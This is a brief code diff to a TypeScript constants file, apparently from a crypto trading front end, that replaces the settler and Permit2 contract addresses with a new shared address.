@@ -96,9 +96,9 @@ export const ALCHEMY_KEY =
 
 export const SETTLER_ADDR =
   (process.env.NEXT_PUBLIC_SETTLER_ADDR as `0x${string}`) ||
-  "0x6511e4ed799cc3e24cd895e93001ec0d9363fc1c";
+  "0x6072e645bab9be651fb195c5e5445625a7606ec8";
 
-export const PERMIT2_ADDRESS = "0x6511e4ed799cc3e24cd895e93001ec0d9363fc1c";
+export const PERMIT2_ADDRESS = "0x6072e645bab9be651fb195c5e5445625a7606ec8";
 
 /**
  * ⛓️ EVM CHAIN REGISTRY
